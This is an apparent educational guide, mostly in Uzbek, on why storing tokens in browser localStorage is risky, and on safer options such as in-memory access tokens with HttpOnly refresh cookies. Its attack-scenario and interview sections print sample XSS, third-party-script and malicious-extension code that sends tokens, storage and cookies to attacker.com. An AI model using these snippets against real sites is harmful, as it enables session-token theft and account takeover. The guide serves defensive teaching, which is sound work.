# LocalStorage Risks

## Mundarija
1. [Web Storage API](#web-storage-api)
2. [LocalStorage Xavflari](#localstorage-xavflari)
3. [Token Saqlash Strategiyalari](#token-saqlash-strategiyalari)
4. [Zaif vs Xavfsiz Kod](#zaif-vs-xavfsiz-kod)
5. [Real Attack Scenarios](#real-attack-scenarios)
6. [Alternativ Yechimlar](#alternativ-yechimlar)
7. [Interview Savollari](#interview-savollari)

---

## Web Storage API

### localStorage vs sessionStorage

```javascript
// localStorage - Doimiy saqlash
localStorage.setItem('key', 'value');
localStorage.getItem('key');      // 'value'
localStorage.removeItem('key');
localStorage.clear();

// sessionStorage - Tab/Window scope
sessionStorage.setItem('key', 'value');
// Tab yopilganda o'chadi
```

### Storage Comparison

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        Storage Comparison                                │
├─────────────────┬───────────────┬───────────────┬───────────────────────┤
│                 │ localStorage  │ sessionStorage│ Cookie                │
├─────────────────┼───────────────┼───────────────┼───────────────────────┤
│ Capacity        │ ~5-10 MB      │ ~5-10 MB      │ ~4 KB                 │
│ Expiration      │ Manual        │ Tab close     │ Max-Age/Expires       │
│ Server access   │ No (JS only)  │ No (JS only)  │ Yes (automatic)       │
│ XSS vulnerable  │ Yes           │ Yes           │ No (if HttpOnly)      │
│ CSRF vulnerable │ No            │ No            │ Yes (without SameSite)│
│ Scope           │ Origin        │ Tab + Origin  │ Path + Domain         │
│ Data type       │ String only   │ String only   │ String only           │
└─────────────────┴───────────────┴───────────────┴───────────────────────┘
```

### Basic Usage

```javascript
// Store object (must serialize)
const user = { id: 1, name: 'John' };
localStorage.setItem('user', JSON.stringify(user));

// Retrieve
const stored = JSON.parse(localStorage.getItem('user'));

// Error handling
const safeGet = (key) => {
  try {
    const item = localStorage.getItem(key);
    return item ? JSON.parse(item) : null;
  } catch (e) {
    console.error('localStorage parse error:', e);
    return null;
  }
};

// Storage event (cross-tab communication)
window.addEventListener('storage', (e) => {
  console.log('Key:', e.key);
  console.log('Old value:', e.oldValue);
  console.log('New value:', e.newValue);
});
```

---

## LocalStorage Xavflari

### 1. XSS Vulnerability (Asosiy Muammo)

```javascript
// localStorage XSS uchun to'liq ochiq
// Har qanday JavaScript kodda o'qish mumkin

// Stored token
localStorage.setItem('accessToken', 'eyJhbGciOiJIUzI1NiIs...');

// Agar XSS vulnerability mavjud bo'lsa:
// Hujumchi script (injected via XSS)
<script>
  const token = localStorage.getItem('accessToken');
  const allData = JSON.stringify(localStorage);

  // Token'ni o'g'irlash
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      token: token,
      allStorage: allData,
      cookies: document.cookie,  // Non-HttpOnly cookies
      url: window.location.href
    })
  });

  // Yoki real-time exfiltration
  new Image().src = `https://attacker.com/steal?t=${encodeURIComponent(token)}`;
</script>
```

### 2. Persistent Storage Attack Surface

```javascript
// localStorage DOIMIY
// Hatto brauzer yopilganda ham saqlanadi

// Muammo 1: Token o'g'irilsa - uzoq vaqt valid
localStorage.setItem('token', token);  // Expire date yo'q client-side

// Muammo 2: Shared/Public kompyuterlar
// Foydalanuvchi logout qilmasa - keyingi odam kiradi

// Muammo 3: Malware/Browser extensions
// Barcha extension'lar localStorage'ga kira oladi
chrome.storage.local.get(['accessToken'], (result) => {
  // Extension token'ni o'qidi
});
```

### 3. No Built-in Security Features

```
┌─────────────────────────────────────────────────────────────────────┐
│                localStorage LACKS:                                   │
├─────────────────────────────────────────────────────────────────────┤
│ ❌ HttpOnly equivalent     - JavaScript DOIM o'qiy oladi           │
│ ❌ Secure equivalent       - HTTP/HTTPS farqi yo'q                 │
│ ❌ SameSite equivalent     - Cross-origin restriction yo'q         │
│ ❌ Expiration              - Manual implement kerak                │
│ ❌ Encryption              - Plain text saqlanadi                  │
│ ❌ Integrity check         - Tamper detection yo'q                 │
└─────────────────────────────────────────────────────────────────────┘
```

### 4. Cross-Tab/Window Exposure

```javascript
// Bir tab'da XSS - barcha tab'lar expose

// Tab 1: Banking app (logged in)
localStorage.setItem('bankToken', 'secret');

// Tab 2: Forum (XSS vulnerability)
// Hujumchi script:
const bankToken = localStorage.getItem('bankToken');
// Bank token'ni forum tab'dan o'g'irladi!

// Hatto cookie bilan ham:
// Cookie SameSite bilan himoyalangan
// LocalStorage esa HECH QANDAY himoya yo'q
```

---

## Token Saqlash Strategiyalari

### Strategy 1: Memory Only (Recommended for SPAs)

```javascript
// Token faqat JavaScript variable'da
// Page refresh'da yo'qoladi - refresh token bilan qayta olinadi

class AuthService {
  #accessToken = null;  // Private field - memory only

  setToken(token) {
    this.#accessToken = token;
  }

  getToken() {
    return this.#accessToken;
  }

  clearToken() {
    this.#accessToken = null;
  }

  // Page load'da refresh token orqali access token olish
  async initializeAuth() {
    try {
      const response = await fetch('/api/auth/refresh', {
        method: 'POST',
        credentials: 'include'  // HttpOnly refresh token cookie
      });

      if (response.ok) {
        const { accessToken } = await response.json();
        this.setToken(accessToken);
        return true;
      }
    } catch (e) {
      console.error('Auth initialization failed');
    }
    return false;
  }
}

// Singleton instance
export const authService = new AuthService();
```

### Strategy 2: HttpOnly Cookie (Server-Side)

```javascript
// Backend: Token'ni HttpOnly cookie'da yuborish
app.post('/api/auth/login', async (req, res) => {
  const user = await authenticate(req.body);
  const token = generateToken(user);

  // Token cookie'da - JavaScript kira olmaydi
  res.cookie('accessToken', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000,  // 15 min
    path: '/'
  });

  // Response'da token YO'Q
  res.json({ success: true, user: { id: user.id, name: user.name } });
});

// Frontend: Cookie avtomatik yuboriladi
const fetchWithAuth = async (url, options = {}) => {
  return fetch(url, {
    ...options,
    credentials: 'include'  // Cookie yuborish
  });
};
```

### Strategy 3: Hybrid (Access in Memory + Refresh in Cookie)

```javascript
// BEST PRACTICE:
// - Access Token: Memory (JavaScript variable)
// - Refresh Token: HttpOnly Cookie

// Backend
app.post('/api/auth/login', async (req, res) => {
  const user = await authenticate(req.body);

  const accessToken = generateAccessToken(user);   // 15 min
  const refreshToken = generateRefreshToken(user); // 7 days

  // Refresh token HttpOnly cookie'da
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000,
    path: '/api/auth/refresh'  // Faqat refresh endpoint'ga
  });

  // Access token response body'da
  res.json({
    accessToken,
    expiresIn: 900  // 15 min in seconds
  });
});

// Frontend
class AuthService {
  #accessToken = null;
  #tokenExpiry = null;

  async login(credentials) {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(credentials)
    });

    const { accessToken, expiresIn } = await response.json();
    this.#accessToken = accessToken;
    this.#tokenExpiry = Date.now() + (expiresIn * 1000);

    // Auto-refresh setup
    this.scheduleRefresh(expiresIn);
  }

  scheduleRefresh(expiresIn) {
    // 1 daqiqa oldin refresh
    const refreshIn = (expiresIn - 60) * 1000;

    setTimeout(async () => {
      await this.refreshToken();
    }, refreshIn);
  }

  async refreshToken() {
    const response = await fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include'  // Refresh cookie avtomatik
    });

    if (response.ok) {
      const { accessToken, expiresIn } = await response.json();
      this.#accessToken = accessToken;
      this.#tokenExpiry = Date.now() + (expiresIn * 1000);
      this.scheduleRefresh(expiresIn);
    } else {
      // Refresh failed - logout
      this.logout();
    }
  }
}
```

### Strategy Comparison

```
┌───────────────────────────────────────────────────────────────────────────┐
│                    Token Storage Strategy Comparison                       │
├──────────────────────┬───────────┬───────────┬─────────────┬──────────────┤
│ Strategy             │ XSS Safe  │ CSRF Safe │ Persistent  │ Complexity   │
├──────────────────────┼───────────┼───────────┼─────────────┼──────────────┤
│ localStorage         │ ❌        │ ✅        │ ✅          │ Low          │
│ sessionStorage       │ ❌        │ ✅        │ ❌          │ Low          │
│ Cookie (no HttpOnly) │ ❌        │ ❌        │ ✅          │ Low          │
│ Cookie (HttpOnly)    │ ✅        │ ❌        │ ✅          │ Medium       │
│ Memory only          │ ✅        │ ✅        │ ❌          │ Medium       │
│ Memory + HttpOnly RT │ ✅        │ ✅        │ ✅          │ High         │
├──────────────────────┴───────────┴───────────┴─────────────┴──────────────┤
│ ✅ Recommended: Memory + HttpOnly Refresh Token                           │
└───────────────────────────────────────────────────────────────────────────┘
```

---

## Zaif vs Xavfsiz Kod

### 1. Direct Token Storage

```javascript
// ❌ ZAIF: Token localStorage'da
const login = async (credentials) => {
  const response = await fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify(credentials)
  });

  const { token } = await response.json();
  localStorage.setItem('token', token);  // XSS VULNERABLE!
};

// Har request'da
const fetchData = async (url) => {
  const token = localStorage.getItem('token');  // Hujumchi ham o'qiy oladi
  return fetch(url, {
    headers: { 'Authorization': `Bearer ${token}` }
  });
};

// ✅ XAVFSIZ: Token memory'da
class SecureAuth {
  #token = null;

  async login(credentials) {
    const response = await fetch('/api/login', {
      method: 'POST',
      credentials: 'include',  // HttpOnly cookie uchun
      body: JSON.stringify(credentials)
    });

    const { accessToken } = await response.json();
    this.#token = accessToken;  // Memory only - XSS olmaydi
  }

  getAuthHeader() {
    return this.#token ? { 'Authorization': `Bearer ${this.#token}` } : {};
  }
}
```

### 2. Sensitive User Data

```javascript
// ❌ ZAIF: Sensitive data localStorage'da
localStorage.setItem('user', JSON.stringify({
  id: 123,
  email: 'user@example.com',
  role: 'admin',
  creditCard: '4111111111111111',  // XATO!
  ssn: '123-45-6789',               // XATO!
  apiKey: 'sk_live_xxx'             // XATO!
}));

// ✅ XAVFSIZ: Minimal, non-sensitive data
localStorage.setItem('userPreferences', JSON.stringify({
  theme: 'dark',
  language: 'en',
  // Non-sensitive UI preferences only
}));

// Sensitive data serverdan har safar so'rash
const getUserProfile = async () => {
  return fetch('/api/user/profile', {
    credentials: 'include'
  }).then(r => r.json());
};
```

### 3. Missing Expiration

```javascript
// ❌ ZAIF: Token hech qachon expire bo'lmaydi
localStorage.setItem('token', token);
// Brauzer yopilsa ham, 1 yil keyin ham valid

// ✅ XAVFSIZ: Client-side expiration check
const setTokenWithExpiry = (key, token, ttlMs) => {
  const item = {
    value: token,
    expiry: Date.now() + ttlMs
  };
  localStorage.setItem(key, JSON.stringify(item));
};

const getTokenWithExpiry = (key) => {
  const itemStr = localStorage.getItem(key);
  if (!itemStr) return null;

  try {
    const item = JSON.parse(itemStr);

    if (Date.now() > item.expiry) {
      localStorage.removeItem(key);
      return null;  // Expired
    }

    return item.value;
  } catch {
    return null;
  }
};

// Usage
setTokenWithExpiry('token', accessToken, 15 * 60 * 1000);  // 15 min
```

### 4. No Validation on Read

```javascript
// ❌ ZAIF: localStorage'dan o'qib to'g'ridan ishlatish
const token = localStorage.getItem('token');
if (token) {
  // Token valid deb o'ylash - XATO
  fetchProtectedData(token);
}

// ✅ XAVFSIZ: Server-side validation
const validateAndUseToken = async () => {
  const token = localStorage.getItem('token');  // Agar localStorage ishlatilsa

  if (!token) {
    redirectToLogin();
    return;
  }

  try {
    // Token'ni server bilan validate qilish
    const response = await fetch('/api/auth/validate', {
      headers: { 'Authorization': `Bearer ${token}` }
    });

    if (!response.ok) {
      localStorage.removeItem('token');
      redirectToLogin();
      return;
    }

    // Token valid
    return true;
  } catch {
    redirectToLogin();
  }
};
```

### 5. Cross-Tab Sync Without Validation

```javascript
// ❌ ZAIF: Storage event'da tekshirmasdan qabul qilish
window.addEventListener('storage', (e) => {
  if (e.key === 'token') {
    // Yangi token'ni tekshirmasdan ishlatish
    updateAuthState(e.newValue);  // Malicious value bo'lishi mumkin
  }
});

// ✅ XAVFSIZ: Validation bilan
window.addEventListener('storage', async (e) => {
  if (e.key === 'token' && e.newValue) {
    // Server bilan validate qilish
    const isValid = await validateToken(e.newValue);

    if (isValid) {
      updateAuthState(e.newValue);
    } else {
      // Potential attack - log out all tabs
      localStorage.removeItem('token');
      redirectToLogin();
    }
  }

  if (e.key === 'token' && e.newValue === null) {
    // Logout from another tab
    clearAuthState();
    redirectToLogin();
  }
});
```

---

## Real Attack Scenarios

### Scenario 1: XSS Token Theft

```javascript
// Vulnerable React component
const Comment = ({ content }) => {
  // ❌ dangerouslySetInnerHTML without sanitization
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
};

// Hujumchi comment qo'shadi:
const maliciousComment = `
  Great post!
  <img src="x" onerror="
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        token: localStorage.getItem('accessToken'),
        refreshToken: localStorage.getItem('refreshToken'),
        user: localStorage.getItem('user')
      })
    })
  ">
`;

// Har kim shu comment'ni ko'rganda - token'lari o'g'iriladi
```

**Natija:**
- Hujumchi token oldi
- Victim sifatida API'ga kirdi
- Account takeover

### Scenario 2: Third-Party Script Attack

```html
<!-- index.html -->
<script src="https://cdn.analytics-tracker.com/script.js"></script>
<!-- CDN compromised yoki malicious script -->

<!-- Malicious script content: -->
<script>
  // Sahifa yuklanganda barcha storage'ni o'g'irlash
  (function() {
    const data = {
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage),
      cookies: document.cookie,
      url: window.location.href,
      referrer: document.referrer
    };

    // Beacon API - user bilmaydi
    navigator.sendBeacon('https://attacker.com/collect', JSON.stringify(data));
  })();
</script>
```

**Natija:**
- Supply chain attack
- Barcha foydalanuvchilar expose
- Silent data exfiltration

### Scenario 3: Browser Extension Attack

```javascript
// Malicious browser extension
// manifest.json: "permissions": ["storage", "<all_urls>"]

// background.js
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url.includes('bank.com')) {
    // Content script inject
    chrome.tabs.executeScript(tabId, {
      code: `
        chrome.runtime.sendMessage({
          type: 'STEAL_DATA',
          data: {
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage)
          }
        });
      `
    });
  }
});

// Data exfiltration
chrome.runtime.onMessage.addListener((message) => {
  if (message.type === 'STEAL_DATA') {
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify(message.data)
    });
  }
});
```

### Scenario 4: Shared Computer Attack

```javascript
// Public computer (library, internet cafe)

// User 1 login qiladi
localStorage.setItem('token', 'user1_token');
localStorage.setItem('user', JSON.stringify({ name: 'User 1', email: '...' }));

// User 1 logout qilishni UNUTADI (yoki logout to'liq emas)

// User 2 keladi
// DevTools → Application → LocalStorage
// Barcha tokenlarni ko'radi

// Yoki User 2 quyidagi sahifaga kiradi:
// evil-site.com/?steal=true
// Script localStorage'ni o'qiydi
```

**Himoya:**
```javascript
// Logout'da to'liq tozalash
const secureLogout = () => {
  // LocalStorage
  localStorage.clear();

  // SessionStorage
  sessionStorage.clear();

  // IndexedDB
  indexedDB.deleteDatabase('appDB');

  // Cache
  if ('caches' in window) {
    caches.keys().then(names => {
      names.forEach(name => caches.delete(name));
    });
  }

  // Cookies (non-HttpOnly)
  document.cookie.split(';').forEach(c => {
    document.cookie = c.trim().split('=')[0] +
      '=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/';
  });

  // Server session invalidation
  fetch('/api/auth/logout', { method: 'POST', credentials: 'include' });

  // Redirect
  window.location.href = '/login';
};
```

---

## Alternativ Yechimlar

### 1. Service Worker Token Management

```javascript
// service-worker.js
// Token service worker'da saqlanadi - page JS'dan isolated

let accessToken = null;

self.addEventListener('message', (event) => {
  if (event.data.type === 'SET_TOKEN') {
    accessToken = event.data.token;
  }

  if (event.data.type === 'GET_TOKEN') {
    event.ports[0].postMessage({ token: accessToken });
  }

  if (event.data.type === 'CLEAR_TOKEN') {
    accessToken = null;
  }
});

// Token'ni request'larga qo'shish
self.addEventListener('fetch', (event) => {
  if (event.request.url.includes('/api/') && accessToken) {
    const modifiedRequest = new Request(event.request, {
      headers: new Headers({
        ...Object.fromEntries(event.request.headers),
        'Authorization': `Bearer ${accessToken}`
      })
    });
    event.respondWith(fetch(modifiedRequest));
  }
});
```

```javascript
// Main app
const setToken = (token) => {
  navigator.serviceWorker.controller.postMessage({
    type: 'SET_TOKEN',
    token
  });
};

// XSS script service worker'dagi token'ni o'qiy olmaydi
// (Service worker alohida context)
```

### 2. Web Crypto API Encryption

```javascript
// localStorage'da encrypt qilingan saqlash
// (XSS'dan to'liq himoya EMAS, lekin qo'shimcha qatlam)

class SecureStorage {
  #key = null;

  async init() {
    // Generate or retrieve encryption key
    this.#key = await this.getOrCreateKey();
  }

  async getOrCreateKey() {
    // Key IndexedDB'da (XSS accessible, but better than localStorage)
    // Ideal: Key server-side yoki hardware security module'da

    return crypto.subtle.generateKey(
      { name: 'AES-GCM', length: 256 },
      false,  // Not extractable
      ['encrypt', 'decrypt']
    );
  }

  async setItem(key, value) {
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encodedValue = new TextEncoder().encode(JSON.stringify(value));

    const encrypted = await crypto.subtle.encrypt(
      { name: 'AES-GCM', iv },
      this.#key,
      encodedValue
    );

    const combined = new Uint8Array(iv.length + encrypted.byteLength);
    combined.set(iv);
    combined.set(new Uint8Array(encrypted), iv.length);

    localStorage.setItem(key, btoa(String.fromCharCode(...combined)));
  }

  async getItem(key) {
    const stored = localStorage.getItem(key);
    if (!stored) return null;

    try {
      const combined = Uint8Array.from(atob(stored), c => c.charCodeAt(0));
      const iv = combined.slice(0, 12);
      const encrypted = combined.slice(12);

      const decrypted = await crypto.subtle.decrypt(
        { name: 'AES-GCM', iv },
        this.#key,
        encrypted
      );

      return JSON.parse(new TextDecoder().decode(decrypted));
    } catch {
      return null;
    }
  }
}
```

### 3. IndexedDB with Integrity Checks

```javascript
// IndexedDB bilan HMAC integrity
const db = await openDB('authDB', 1, {
  upgrade(db) {
    db.createObjectStore('tokens');
  }
});

const storeToken = async (token) => {
  // Server-generated HMAC
  const response = await fetch('/api/auth/sign-token', {
    method: 'POST',
    body: JSON.stringify({ token })
  });
  const { signature } = await response.json();

  await db.put('tokens', { token, signature }, 'accessToken');
};

const getToken = async () => {
  const stored = await db.get('tokens', 'accessToken');
  if (!stored) return null;

  // Server-side signature verification
  const response = await fetch('/api/auth/verify-token', {
    method: 'POST',
    body: JSON.stringify(stored)
  });

  if (!response.ok) {
    await db.delete('tokens', 'accessToken');
    return null;  // Tampered
  }

  return stored.token;
};
```

---

## Interview Savollari

### 1. Nima uchun localStorage'da JWT saqlash xavfli?

**Javob:**

LocalStorage XSS hujumlariga to'liq ochiq:

1. **JavaScript Access:**
   - `localStorage.getItem('token')` har qanday JS kod orqali o'qiladi
   - XSS vulnerability mavjud bo'lsa - token o'g'iriladi

2. **No HttpOnly Equivalent:**
   - Cookie'da HttpOnly JS access'ni bloklaydi
   - LocalStorage'da bunday himoya YO'Q

3. **Persistent Attack Surface:**
   - Brauzer yopilganda ham saqlanadi
   - Token o'g'irilsa - uzoq vaqt ishlatilishi mumkin

4. **Third-party Scripts:**
   - Har qanday script (analytics, ads) localStorage'ni o'qiy oladi
   - Supply chain attack xavfi

**Yechim:** Access token memory'da, refresh token HttpOnly cookie'da.

---

### 2. localStorage vs sessionStorage xavfsizlik jihatdan farqi?

**Javob:**

| Aspect | localStorage | sessionStorage |
|--------|--------------|----------------|
| XSS Vulnerable | Ha | Ha |
| Persistence | Doimiy | Tab close'da o'chadi |
| Cross-tab | Ha (shared) | Yo'q (tab-specific) |
| Attack window | Uzoq | Qisqa |

**Farqlar:**
- sessionStorage bir tab'da XSS bo'lsa boshqa tab'larga ta'sir qilmaydi
- sessionStorage tab yopilganda o'chadi - attack window qisqa
- Lekin IKKALASI ham XSS vulnerable - fundamental xavfsizlik farqi YO'Q

**Xulosа:** Ikkalasi ham sensitive data uchun mos emas.

---

### 3. Token'ni qayerda saqlash kerak va nima uchun?

**Javob:**

**Recommended Pattern:**
```
Access Token  → JavaScript Memory (variable)
Refresh Token → HttpOnly, Secure, SameSite Cookie
```

**Sabablari:**

1. **Access Token Memory'da:**
   - XSS o'g'irlab olmaydi (memory isolated)
   - Page refresh'da yo'qoladi - qisqa attack window
   - 15-30 daqiqa expire - minimal risk

2. **Refresh Token HttpOnly Cookie:**
   - XSS o'g'irlab olmaydi (HttpOnly)
   - CSRF safe (SameSite=Strict)
   - Page refresh'da saqlanadi - UX yaxshi
   - Faqat refresh endpoint'ga yuboriladi (Path=/api/auth/refresh)

3. **Page Reload Strategy:**
   - App load'da refresh endpoint'ga so'rov
   - Yangi access token olish
   - Memory'ga saqlash

---

### 4. XSS hujumida localStorage'dagi barcha data qanday o'g'irlanadi?

**Javob:**

```javascript
// Hujumchi XSS orqali inject qilgan kod:

// Method 1: Direct exfiltration
const allData = {};
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  allData[key] = localStorage.getItem(key);
}
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify(allData)
});

// Method 2: Image beacon (CSP bypass attempt)
new Image().src = 'https://attacker.com/steal?data=' +
  encodeURIComponent(JSON.stringify(localStorage));

// Method 3: WebSocket (real-time)
const ws = new WebSocket('wss://attacker.com/ws');
ws.onopen = () => ws.send(JSON.stringify(localStorage));

// Method 4: Persistent (MutationObserver)
const observer = new MutationObserver(() => {
  // Har DOM o'zgarganda token tekshirish
});
observer.observe(document, { childList: true, subtree: true });
```

**Himoya:** HttpOnly cookies, CSP, input sanitization, token'ni localStorage'da saqlamaslik.

---

### 5. Shared/public kompyuterda localStorage xavfi qanday kamaytiriladi?

**Javob:**

**Technical Measures:**

1. **Aggressive Logout:**
```javascript
// Barcha storage'ni tozalash
localStorage.clear();
sessionStorage.clear();
indexedDB.deleteDatabase('appDB');
// + Server session invalidation
```

2. **Session Timeout:**
```javascript
// Idle timeout
let idleTimer;
document.addEventListener('mousemove', resetTimer);
document.addEventListener('keypress', resetTimer);

const resetTimer = () => {
  clearTimeout(idleTimer);
  idleTimer = setTimeout(autoLogout, 5 * 60 * 1000);  // 5 min
};
```

3. **Browser Close Detection:**
```javascript
window.addEventListener('beforeunload', (e) => {
  // Sync logout attempt (may not complete)
  navigator.sendBeacon('/api/auth/logout');
});
```

4. **Server-side:**
- Short session expiration
- Device fingerprinting
- Anomaly detection (same user, different location)

**User Education:**
- "Logout" tugmasini bosishni so'rash
- Private/Incognito mode'ni tavsiya qilish
